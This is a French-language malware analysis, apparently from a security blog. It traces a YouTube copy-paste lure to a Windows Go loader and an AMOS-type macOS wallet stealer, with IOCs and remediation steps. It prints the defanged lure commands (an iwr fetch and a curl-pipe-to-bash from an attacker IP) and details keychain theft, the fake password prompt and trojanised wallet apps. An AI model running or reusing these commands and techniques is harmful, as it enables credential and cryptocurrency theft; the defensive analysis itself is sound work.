@@ -1,0 +1,171 @@
+---
+title: D'une vidéo YouTube à deux stealers
+kind: security
+year: "2026"
+order: 5
+status: Investigation
+summary: Une vidéo YouTube à 45 000 vues renvoyait vers un paste avec une commande par système. J'ai suivi les deux chaînes jusqu'au bout. Côté macOS, un stealer de portefeuilles avec quatre domaines C2. Côté Windows, un binaire Go passé à garble qui cache ses appels d'API.
+why: Les leurres « copiez-collez cette commande » sont partout sur YouTube, et la plupart des analyses s'arrêtent au premier script. Je voulais voir ce qui arrive vraiment sur la machine.
+note: Tout ce qui suit relève de l'analyse statique ou de l'émulation. Aucune des deux charges n'a été exécutée, et je n'ai pas contacté les serveurs C2 pendant l'analyse.
+stack: [Ghidra 12.1, REA, Unicorn, Capstone, LIEF, Python]
+results:
+  - value: "2"
+    label: chaînes d'infection, une par système
+  - value: "4"
+    label: domaines C2 décodés depuis la config macOS
+  - value: "203"
+    label: identifiants d'extensions ciblés, surtout des portefeuilles
+  - value: "39"
+    label: API Windows déchiffrées en émulant le déchiffreur
+---
+
+## Le point de départ
+
+Une vidéo YouTube d'environ 45 000 vues (ID `3FyBGgkkjSw`), plus plusieurs autres vidéos qui mènent au même lien. La description renvoie vers un paste Pastebin (`UthsJdis`) qui propose une commande par plateforme, présentée comme un « installeur ».
+
+| Système | Ce que le paste demande de lancer |
+| --- | --- |
+| Windows | `iwr "hxxp://soft-storage[.]top/worker?=7341210743/ai-plugin" -UseBasicParsing` |
+| macOS | une vraie commande `bun.sh/install`, enchaînée avec `/bin/bash -c "$(curl -fsSL hxxp://192.162.199[.]249/9rmoz4cqi58)"` |
+
+Le vrai installeur Bun placé en tête sert à rendre la commande crédible.
+
+## Les deux chaînes
+
+<Pipeline>
+  <Lane title="Windows">
+    <Stage label="paste" sub="one-liner iwr" />
+    <Stage label="soft-storage[.]top" sub="stager .ps1 filtré par UA" />
+    <Stage label="193.148.56[.]147" sub="PE en base64" />
+    <Stage label="cmmd.exe" sub="Go passé à garble" />
+  </Lane>
+  <Lane title="macOS">
+    <Stage label="paste" sub="bun + curl | bash" />
+    <Stage label="192.162.199[.]249" sub="script shell" />
+    <Stage label="$TMPDIR" sub="xattr -c, chmod +x, exécution" />
+    <Stage label="Mach-O" sub="stealer de portefeuilles" />
+  </Lane>
+</Pipeline>
+
+### Le serveur Windows vérifie le User-Agent
+
+Ouvrir `soft-storage[.]top/worker` dans un navigateur ne renvoie rien, et un `curl` simple non plus. Le serveur ne répond qu'au User-Agent exact de PowerShell 7 : `Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.5.0`. Ce filtre peu coûteux empêche les sandboxes et les scanners qui suivent le lien de récupérer la charge.
+
+### Le stager PowerShell
+
+Le script renvoyé (`mal.ps1`) :
+
+1. Télécharge un blob base64 depuis `hxxp://193.148.56[.]147/final_check?=7311907082/Unlim-api-plugin`, avec un User-Agent bidon (`SJSHDUWSJHIAO0WUI…`).
+2. S'il tourne en administrateur, il ajoute des exclusions Defender pour `C:\Windows\Temp`, `C:\` et `C:\ProgramData`. Il coupe aussi SmartScreen via quatre valeurs de registre, lance `gpupdate /force` puis exécute la charge en élevé sous `C:\ProgramData\cmmd.exe`. Sinon, il la lance sous `%TEMP%\cmmd.exe`.
+3. Affiche un faux compteur `Checking 1%…100%`, puis `Success | issues - 0!`.
+4. Vide le presse-papiers et son historique Windows, efface le fichier d'historique PSReadLine et désactive son enregistrement. La commande collée disparaît.
+
+Le base64 se décode octet pour octet vers le PE analysé ensuite (SHA-256 `85b6396c…20d7`).
+
+## Charge Windows : du Go passé à garble
+
+`cmmd.exe` est un binaire Go 1.23.1 de 3 Mo, compilé avec [garble](https://github.com/burrowers/garble). Les fonctions de `main` portent des noms aléatoires (`main.zkWN8Ho3NqlvPT`, `main.qssh2XqU`…). Le seul vrai nom restant est le chemin source, `SterlingSignalVentures/main.go`.
+
+**`main.main` se cache dans du remplissage.** La fonction se décompile en 13 000 lignes. Ghidra échouait d'abord avec `Response buffer size exceeded`, jusqu'à ce que je relève la limite de 50 Mo du décompilateur (`DecompileOptions.setMaxPayloadMBytes`). Environ 2 000 de ses appels sont du remplissage `runtime.printint` / `printstring`, avec en prime un faux affichage de tableau (`mills: … men: … three-sum: …`).
+
+**Aucun nom d'API lisible.** Les API Windows sont résolues à l'exécution via `LoadLibrary` et `GetProcAddress`. Leurs noms viennent d'une table de 39 entrées à `0x6c86c0`, chaque nom chiffré avec sa propre clé. Le déchiffreur (`main.qssh2XqU`) est aplati, alors plutôt que de le rétro-concevoir, je l'ai émulé.
+
+- J'ai chargé le PE dans Unicorn avec une fausse goroutine dans `R14`, pour que la vérification de pile de Go passe.
+- J'ai remplacé les quelques appels runtime dont il a besoin (`mallocgc`, `makeslice`, `growslice`, `memmove`) par un allocateur linéaire.
+- Puis je l'ai appelé une fois par entrée avec l'ABI à registres de Go.
+
+Les 78 appels (un nom de DLL et un nom d'API par entrée) sont revenus en clair :
+
+| DLL | API |
+| --- | --- |
+| user32 | `CreateDesktopW`, `OpenDesktopW`, `CloseDesktop`, `GetDC`, `GetWindowDC`, `GetWindowRect`, `GetSystemMetrics`, `EnumDisplaySettingsW`, `GetKeyboardLayout(NameA/W)` … |
+| gdi32 | `BitBlt`, `CreateCompatibleDC`, `CreateCompatibleBitmap`, `GetDIBits`, `SelectObject` … |
+| ole32 / oleaut32 | `CoInitializeSecurity`, `CoCreateInstance`, `CoSetProxyBlanket`, `SysAllocString`, `VariantClear` … |
+| kernel32 / advapi32 | `GetComputerNameExA`, `GetUserNameA`, `LookupPrivilegeValueW`, `ExitProcess` … |
+
+Cet ensemble correspond à un outil de capture d'écran sur bureau caché. Il crée son propre bureau, le capture avec GDI et récupère les infos de l'hôte et de l'utilisateur. Les appels de sécurité COM ressemblent à des requêtes WMI. Les API de disposition clavier servent d'habitude à éviter certains pays.
+
+<Note>Ce que je n'ai pas pu boucler : aucune fonction `main.*` n'appelle directement d'API réseau, et aucune autre chaîne n'est chiffrée dans le même format. Soit la couche réseau passe par COM, soit ce build n'est qu'un module d'un ensemble plus grand. Je laisse la question ouverte plutôt que de deviner.</Note>
+
+## Charge macOS : un stealer de portefeuilles, config à un XOR près
+
+`p7tp4i95c5x1fs96` est un Mach-O universel (x86_64 + arm64) écrit en C++. Il est signé ad hoc avec l'identifiant `macos-stealer-v2-…`. Les auteurs l'ont au moins nommé honnêtement.
+
+### Les chaînes : XOR 128 bits, construites en ligne
+
+Il n'y a que 11 chaînes en clair. Toutes les autres sont assemblées sur la pile à partir de valeurs immédiates, puis XORées avec une clé de 128 bits gardée en registres (`vpxor` / `vxorps`). Décompiler `main` prenait plus de dix minutes, alors j'ai fait plus brutal. J'ai fait passer chaque instruction de `__text` une fois dans Unicorn, dans l'ordre des adresses, en sautant appels et branchements, et j'ai relevé `xmm` après chaque XOR. Résultat : 566 chaînes lisibles.
+
+### La config : un XOR tournant
+
+La liste C2 n'était pas parmi ces chaînes. Elle se trouve dans un blob de 329 octets au début de `__DATA,__data`. Le blob commence par une clé de 8 octets, et le décodeur XORe chaque octet avec la clé, qu'il fait tourner d'un bit vers la droite à chaque octet. Six lignes de Python suffisent, et les deux architectures donnent la même config :
+
+- tag de build `mrdor`
+- C2 : `lewokodwqko[.]icu`, `shopguoerve[.]pro`, `dfsjfisafosdikfos[.]info`, `isosissisisossfiof[.]com` (tous en HTTPS)
+- fichiers à voler : `txt md csv json doc docx xls xlsx pdf cfg kdbx`
+- fausse invite de mot de passe : titre `System Settings`, texte `Please enter your password to continue`
+
+### Ce qu'il fait
+
+1. Lance `killall Terminal` pour fermer la fenêtre où la commande a été collée.
+2. Demande le mot de passe avec une invite `osascript display dialog … with hidden answer` intitulée « System Settings ». Il vérifie la réponse avec `dscl . -authonly` et redemande tant qu'elle est fausse.
+3. Récupère `login.keychain-db` et lit les clés « Safe Storage » des navigateurs avec `security find-generic-password -w`. Cette clé, avec PBKDF2 et AES (`CCKeyDerivationPBKDF` + `CCCrypt`), permet de déchiffrer les cookies et mots de passe Chromium sur macOS.
+4. Collecte les données de :
+   - **Navigateurs Chromium :** Chrome, Brave, Edge, Arc, Opera, Vivaldi, Yandex, CocCoc. Il prend les cookies, le Local Storage, l'IndexedDB et les `Local Extension Settings` de 203 extensions. J'ai identifié à la main MetaMask, Phantom, Trust, Coinbase Wallet, Binance Chain, TronLink et le gestionnaire de mots de passe Bitwarden.
+   - **Autres navigateurs et applications :** Firefox, les `Cookies.binarycookies` de Safari, `NoteStore.sqlite` d'Apple Notes, `tdata` de Telegram et les jetons Discord.
+   - **Portefeuilles :** Electrum, Exodus, Atomic, Wasabi, Monero, Bitcoin/Litecoin/Dash/Dogecoin Core, Guarda, Binance et TonKeeper.
+5. Utilise un AppleScript Finder pour copier les documents correspondants depuis le Bureau, Documents et Téléchargements, jusqu'à une taille maximale.
+6. Compresse le tout avec `ditto -c -k` et l'envoie avec `curl --fail -X POST`.
+7. **Remplace Ledger Live et Trezor Suite.** Il télécharge un zip, efface la quarantaine avec `xattr -c`, tue l'application d'origine et décompresse la version piégée dans `/Applications`. À la prochaine ouverture de l'appli du portefeuille matériel, c'est celle de l'attaquant.
+8. **Persiste.** Il télécharge un agent dans `~/.hlpr/.agnt` et installe `~/Library/LaunchAgents/com.hlpr.agent.plist` avec `RunAtLoad` et `KeepAlive`. Il active aussi le mode Ne pas déranger pour qu'aucune notification ne le trahisse.
+
+Cela correspond à ce qui a été publié sur la famille AMOS / Atomic Stealer : hameçonnage par boîte de dialogue vérifié avec `dscl`, longue liste de portefeuilles et, plus récemment, des applications Ledger et Trezor piégées et un agent persistant. Je parle de « type AMOS » faute de signature de famille pour le confirmer.
+
+## Indicateurs
+
+| Type | Valeur |
+| --- | --- |
+| Leurre | YouTube `3FyBGgkkjSw`, Pastebin `UthsJdis` |
+| URL | `hxxp://soft-storage[.]top/worker?=7341210743/ai-plugin` |
+| URL | `hxxp://193.148.56[.]147/final_check?=7311907082/Unlim-api-plugin` |
+| URL | `hxxp://192.162.199[.]249/9rmoz4cqi58`, `/p7tp4i95c5x1fs96` |
+| C2 | `lewokodwqko[.]icu`, `shopguoerve[.]pro`, `dfsjfisafosdikfos[.]info`, `isosissisisossfiof[.]com` |
+| UA | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.5.0` (filtre) |
+| Fichier | `%TEMP%\cmmd.exe`, `C:\ProgramData\cmmd.exe` |
+| Fichier | `~/.hlpr/`, `~/Library/LaunchAgents/com.hlpr.agent.plist` |
+| SHA-256 | `ec1797ad0d54252df1cb57dfd4bb6ee9b74d71b991dcd4a8084e66638f087f31` (stager .ps1) |
+| SHA-256 | `85b6396c8af397f659ec0ff75df40bb3b8fdea7301a6d259745dffd65c1e20d7` (cmmd.exe) |
+| SHA-256 | `24920ac8165a30fbff61cb0ce77bb50aa7bc389305d381c4485b9d75bc1ad594` (Mach-O macOS) |
+
+## ATT&CK
+
+| ID | Technique | Où |
+| --- | --- | --- |
+| T1204.004 | User Execution: Malicious Copy and Paste | le paste |
+| T1059.001 / T1059.004 | PowerShell / Unix shell | les deux stagers |
+| T1562.001 | Impair Defenses | exclusions Defender, SmartScreen coupé |
+| T1070.003 | Clear Command History | PSReadLine, historique du presse-papiers |
+| T1027.013 | Encrypted/Encoded File | garble, chaînes XOR, config en XOR tournant |
+| T1106 | Native API | table `GetProcAddress` à l'exécution |
+| T1564.003 | Hidden Window (bureau caché) | `CreateDesktopW` + capture GDI |
+| T1056.002 | GUI Input Capture | fausse boîte « System Settings » |
+| T1555.001 | Keychain | `login.keychain-db`, clés Safe Storage |
+| T1539 | Steal Web Session Cookie | cookies des navigateurs |
+| T1005 | Data from Local System | collecte Finder, portefeuilles, Notes |
+| T1554 | Compromise Host Software Binary | Ledger Live / Trezor Suite piégés |
+| T1543.001 | Launch Agent | `com.hlpr.agent` |
+| T1041 | Exfiltration Over C2 Channel | `curl -X POST` |
+
+## Résultats
+
+<Results />
+
+## Si vous avez lancé l'une de ces commandes
+
+- **macOS :**
+  - Supprimez `~/Library/LaunchAgents/com.hlpr.agent.plist` et `~/.hlpr/`.
+  - Supprimez Ledger Live et Trezor Suite, puis réinstallez-les depuis les sites des éditeurs.
+  - Considérez comme volés le mot de passe de session, le trousseau, toutes les sessions de navigateur et toutes les phrases de récupération. Déplacez vos fonds depuis une machine saine.
+- **Windows :**
+  - Supprimez `cmmd.exe`.
+  - Retirez les exclusions Defender et annulez les modifications SmartScreen dans le registre.
+  - Changez vos identifiants de navigateur depuis un appareil sain.
